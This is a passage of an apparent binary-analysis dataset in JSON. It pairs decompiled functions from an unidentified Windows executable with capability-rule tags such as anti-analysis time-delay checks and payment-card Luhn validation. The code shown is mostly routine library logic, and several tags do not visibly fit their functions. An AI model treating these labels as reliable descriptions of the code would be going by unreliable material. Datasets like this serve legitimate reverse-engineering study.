        "decompiled_code": "\nint32_t __thiscall fcn.004029b0(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.004191ca();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        puVar1 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            puVar1 = *puVar5;\n        }\n        fcn.0040a2e0(puVar4 + param_2, puVar1 + param_3 + param_2, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(puVar5 + iVar3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 348
    },
    "00403700": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00403700(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    iVar3 = *param_2;\n    iVar4 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    ppiVar5 = iVar4 + -0x10;\n    if (ppiVar1 != ppiVar5) {\n        piVar2 = iVar4 + -4;\n        if ((-1 < *(iVar4 + -4)) && (*ppiVar1 == *ppiVar5)) {\n            iVar4 = fcn.00401fd0(ppiVar1);\n            LOCK();\n            iVar3 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n            if (iVar3 == 1 || iVar3 + -1 < 0) {\n                (**(**ppiVar5 + 4))(ppiVar5);\n            }\n            *param_1 = iVar4 + 0x10;\n            return param_1;\n        }\n        fcn.00402f80(iVar3, *(iVar3 + -0xc));\n    }\n    return param_1;\n}\n",
        "token_count": 295
    },
    "0040a2a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040a2a0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 169
    },
    "0040b1d2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b1d2(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.0040d048(*0x4527b4);\n    if (uVar1 < *0x4527b0 + (4 - *0x4527b4)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.0040c405(*0x4527b4, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040c405(*0x4527b4, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x4527b0 = iVar2 + (*0x4527b0 - *0x4527b4 >> 2) * 4;\n        *0x4527b4 = iVar2;\n    }\n    **0x4527b0 = unaff_EDI;\n    *0x4527b0 = *0x4527b0 + 1;\n    return;\n}\n",
        "token_count": 295
    },
    "0040d4ee": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d4ee(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x452790;\n    while( true ) {\n        if (*0x452790 + *0x45278c * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "0041004f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041004f(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00415472(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00415341((0 < arg_10h) + (var_2ch == 0x2d) + arg_ch, arg_10h + 1, &var_2ch);\n    fcn.0040ffa1(arg_10h, arg_14h, 0);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 191
    },
    "00410157": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410157(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00415472(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00415341((var_2ch == 0x2d) + arg_ch, var_28h + arg_10h, &var_2ch);\n    fcn.004100bb(arg_ch, arg_10h, 0);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 183
    },
    "004101b9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101b9(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00415472(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    iVar1 = var_28h + -1;\n    arg_8h_00 = (var_2ch == 0x2d) + arg_ch;\n    fcn.00415341(arg_8h_00, arg_10h, &var_2ch);\n    var_28h = var_28h + -1;\n    if ((var_28h < -4) || (arg_10h <= var_28h)) {\n        fcn.0040ffa1(arg_10h, arg_14h, 1);\n    }\n    else {\n        if (iVar1 < var_28h) {\n            do {\n                pcVar2 = arg_8h_00;\n                arg_8h_00 = pcVar2 + 1;\n            } while (*pcVar2 != '\\0');\n            pcVar2[-1] = '\\0';\n        }\n        fcn.004100bb(arg_ch, arg_10h, 1);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 368
    },
    "004163f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004163f0(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x00416436;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x00416436:\n    return cVar2;\n}\n",
        "token_count": 336
    },
    "00417ba3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417ba3(ushort *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_ch_00;\n    uint var_10h;\n    ushort uStack16;\n    ushort uStack14;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    iVar4 = 0x44ead0;\n    if (arg_ch != 0) {\n        if (arg_ch < 0) {\n            arg_ch = -arg_ch;\n            iVar4 = 0x44ec30;\n        }\n        if (arg_10h == 0) {\n            *arg_8h = 0;\n        }\n        while (arg_ch != 0) {\n            uVar1 = arg_ch >> 3;\n            uVar3 = arg_ch & 7;\n            iVar4 = iVar4 + 0x54;\n            arg_ch = uVar1;\n            if (uVar3 != 0) {\n                arg_ch_00 = iVar4 + uVar3 * 0xc;\n                if (0x7fff < *arg_ch_00) {\n                    var_10h._0_2_ = *arg_ch_00;\n                    var_10h._2_2_ = *arg_ch_00 >> 0x10;\n                    uStack16 = arg_ch_00[1];\n                    uStack14 = arg_ch_00[1] >> 0x10;\n                    uStack12 = arg_ch_00[2];\n                    iVar2 = CONCAT22(uStack16, var_10h._2_2_) + -1;\n                    var_10h._2_2_ = iVar2;\n                    uStack16 = iVar2 >> 0x10;\n                    arg_ch_00 = &var_10h;\n                }\n                fcn.00417971(arg_8h, arg_ch_00);\n            }\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 483
    },
    "004181d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "set environment variable"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004181d0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0040c38a(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar5 = *(iVar1 + 1) == '\\0';\n    if (*0x45103c == *0x451040) {\n        *0x45103c = fcn.0041816f();\n    }\n    if (*0x45103c == NULL) {\n        if ((arg_ch != 0) && (*0x451044 != NULL)) {\n            iVar2 = fcn.0041760c();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x00418285;\n        }\n        if (!bVar5) {\n            *0x45103c = fcn.00409f36(4);\n            if (*0x45103c == NULL) {\n                return 0xffffffff;\n            }\n            **0x45103c = 0;\n            if (*0x451044 == NULL) {\n                *0x451044 = fcn.00409f36(4);\n                if (*0x451044 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x451044 = 0;\n            }\n            goto code_r0x00418285;\n        }\ncode_r0x00418253:\n        var_10h = 0;\n    }\n    else {\ncode_r0x00418285:\n        piVar3 = *0x45103c;\n        iVar2 = fcn.00418122(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar5) {\n                fcn.00409f48(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x00418253;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.0040c405(*0x45103c, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            piVar3[iVar2] = arg_8h_00;\n            (piVar3 + iVar2)[1] = 0;\n            *arg_8h = 0;\ncode_r0x00418322:\n            *0x45103c = piVar3;\n        }\n        else {\n            piVar3 = piVar3 + iVar2;\n            fcn.00409f48(*piVar3);\n            if (bVar5) {\n                for (; *piVar3 != 0; piVar3 = piVar3 + 1) {\n                    *piVar3 = piVar3[1];\n                    iVar2 = iVar2 + 1;\n                }\n                piVar3 = fcn.0040c405(*0x45103c, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x00418322;\n            }\n            else {\n                *piVar3 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.0040baf0(arg_8h_00);\n            iVar2 = fcn.00409f36(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.0040ee40(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar5 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.00409f48(iVar2);\n            }\n        }\n        if (bVar5) {\n            fcn.00409f48(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1099
    },
    "0041baf1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint fcn.0041baf1(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    uVar2 = 0;\n    iVar1 = *(extraout_ECX + 0xc);\n    *(unaff_EBP + -0x10) = &var_14h;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -4) = 0;\n        uVar2 = (**(extraout_ECX + 0xc))();\n        *(unaff_EBP + -0x14) = uVar2;\n        uVar2 = *(unaff_EBP + -0x14);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "0041c7c2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nbool __cdecl\nfcn.0041c7c2(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    char cVar5;\n    bool bVar6;\n    uint var_8h;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = &stack0xffffffb8;\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar1 = fcn.00434fe8();\n        *(unaff_EBP + 0x10) = *(iVar1 + 0xc);\n    }\n    iVar1 = fcn.00434fe8();\n    piVar2 = *(iVar1 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar2;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041eb10(0x10);\n    fcn.0041eb10(0x7c000);\n    if (piVar2 == NULL) {\n        iVar1 = *(unaff_EBP + 8);\ncode_r0x0041c846:\n        if (iVar1 != 0) {\n            piVar2 = fcn.0041bc88();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x1c) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x18) = 0;\n            iVar3 = fcn.00422a29(iVar1, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n            cVar5 = iVar3 == 0;\n            if (*0x450d8c == 0) {\ncode_r0x0041c8bb:\n                if (cVar5 != '\\0') {\ncode_r0x0041c8bf:\n                    fcn.004229fa(iVar1);\n                    *(unaff_EBP + -4) = 2;\n                    fcn.0042295c(*(unaff_EBP + -0x18));\n                    uVar4 = fcn.00422710();\n                    *(unaff_EBP + -0x14) = uVar4;\n                    *(unaff_EBP + -4) = 1;\n                    fcn.00422702();\n                    if (*(unaff_EBP + -0x14) != 0) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    }\n                }\n            }\n            else {\n                if (cVar5) goto code_r0x0041c8bf;\n                iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.0040c688(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    cVar5 = '\\x01' - (iVar3 != 0);\n                    if (cVar5 != '\\0') {\n                        if (*(unaff_EBP + -0x18) == 8) {\n                            *(unaff_EBP + -0x18) = 0;\n                        }\n                        goto code_r0x0041c8bb;\n                    }\n                }\n            }\n            extraout_ECX[0x10] = -1;\n            extraout_ECX[0xe] = extraout_ECX[0xe] | 0x10;\n            fcn.00420590(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            iVar1 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), iVar1, uVar4, fcn.0041c23a, 0);\n            fcn.00401180();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*(unaff_EBP + -0x28) != NULL) {\n                (**(**(unaff_EBP + -0x28) + 0x14))(unaff_EBP + -0x48);\n                if (iVar1 != 0) {\n                    (**(*extraout_ECX + 300))(0);\n                }\n            }\n            iVar3 = fcn.0041ef5f();\n            if (iVar3 == 0) {\n                (**(*extraout_ECX + 0x114))();\n            }\n            if ((iVar1 != 0) && ((*(extraout_ECX + 0xe) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(iVar1);\n                iVar1 = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            bVar6 = iVar1 != 0;\n            goto code_r0x0041c9be;\n        }\n    }\n    else {\n        iVar1 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar1 != 0) {\n            iVar1 = (**(*piVar2 + 0x10))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n            goto code_r0x0041c846;\n        }\n    }\n    bVar6 = false;\ncode_r0x0041c9be:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar6;\n}\n",
        "token_count": 1626
    },
    "0041e7a6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e7a6(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0041cced();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.00408bb5();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.00408d82(iVar5, 1);\n            fcn.00408ded(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.00408d82(iVar5, 2);\n            fcn.00408ded(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.0041ce37(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1084
    },
    "0041fd75": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fd75(uint noname_0, uint *hWnd, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = *hWnd;\n    var_4h = (*_sym.imp.USER32.dll_GetDlgCtrlID)(uVar3);\n    var_4h = var_4h & 0xffff;\n    uVar1 = hWnd[2];\n    iVar2 = fcn.00437973(0x434c5a);\n    if ((*(iVar2 + 0xdc) != in_ECX[7]) && (iVar2 = fcn.0041f935(uVar3, arg_10h),  iVar2 == 0)) {\n        var_ch = arg_10h;\n        var_8h = hWnd;\n        uVar3 = (**(*in_ECX + 0xc))(var_4h, uVar1 & 0xffff | 0x4e0000, &var_ch, 0);\n        return uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 276
    },
    "00421ea8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00421ea8(uint arg_8h, int32_t lpFileTime)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    uint *puStack44;\n    uint lpSystemTime;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint lpLocalFileTime;\n    \n    if (lpFileTime == 0) {\n        puStack44 = 0x44f1a0;\n        fcn.0040ab89(&stack0xffffffd4, 0x448410);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    lpSystemTime._0_2_ = fcn.004099fe();\n    lpSystemTime._2_2_ = fcn.00409a15();\n    puStack44 = 0x421edb;\n    iVar2 = fcn.0040cd90(arg_8h);\n    if (iVar2 == 0) {\n        var_12h._0_2_ = 0;\n    }\n    else {\n        var_12h._0_2_ = *(iVar2 + 0xc);\n    }\n    var_12h._2_2_ = fcn.00409a28();\n    var_eh = fcn.00409a3b();\n    puStack44 = 0x421f0a;\n    puVar3 = fcn.0040cd90(arg_8h);\n    if (puVar3 == NULL) {\n        var_ch = 0xffff;\n    }\n    else {\n        var_ch = *puVar3;\n    }\n    puStack44 = &fcn.00421ea8::lpSystemTime;\n    var_ah = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        puStack44 = (*_sym.imp.KERNEL32.dll_GetLastError)(0);\n        fcn.004225d8();\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalFileTimeToFileTime)(&fcn.00421ea8::lpLocalFileTime, lpFileTime);\n    if (iVar2 == 0) {\n        uVar4 = (*pcVar1)(0);\n        fcn.004225d8(uVar4);\n    }\n    return;\n}\n",
        "token_count": 554
    },
    "00426d35": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426d35(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2);\n            if (iVar3 == 0) goto code_r0x00426d90;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\ncode_r0x00426d90:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 237
    },
    "004282f7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004282f7(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    if (arg_14h == 0) {\n        arg_14h = arg_10h;\n        var_4h = fcn.00427de1(arg_8h, arg_ch, arg_10h);\n        iVar1 = fcn.00427de1(arg_8h, arg_ch, 0);\n        if ((iVar1 != var_4h) && (0 < arg_10h)) {\n            do {\n                iVar1 = (arg_14h + iVar4) / 2;\n                iVar2 = fcn.00427de1(arg_8h, arg_ch, iVar1);\n                if ((iVar2 != var_4h) && (bVar5 = iVar4 == iVar1,  iVar4 = iVar1,  iVar1 = arg_14h,  bVar5)) {\n                    fcn.00427de1(arg_8h, arg_ch, arg_14h);\n                    break;\n                }\n                arg_14h = iVar1;\n            } while (iVar4 < arg_14h);\n        }\n        fcn.004281d5(&var_10h, arg_8h, arg_ch);\n        iVar1 = var_10h;\ncode_r0x0042846f:\n        fcn.00427de1(arg_8h, arg_ch, iVar1);\n    }\n    else {\n        fcn.00427de1(arg_8h, arg_ch, 0);\n        piVar3 = fcn.004281d5(&var_10h, arg_8h, arg_ch);\n        iVar4 = *piVar3;\n        var_4h = piVar3[1];\n        var_8h = iVar4;\n        fcn.00427de1(arg_8h, arg_ch, 0x7fff);\n        piVar3 = fcn.004281d5(&var_18h, arg_8h, arg_ch);\n        iVar1 = *piVar3;\n        var_ch = piVar3[1];\n        var_10h = iVar1;\n        if (iVar4 < iVar1) {\n            do {\n                fcn.00427de1(arg_8h, arg_ch, (iVar4 + iVar1) / 2);\n                piVar3 = fcn.004281d5(&var_18h, arg_8h, arg_ch);\n                iVar4 = piVar3[1];\n                if (arg_10h < iVar4) {\n                    iVar4 = fcn.00409776(*piVar3, iVar4);\n                    if (iVar4 != 0) goto code_r0x0042846f;\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n                else {\n                    if (arg_10h <= 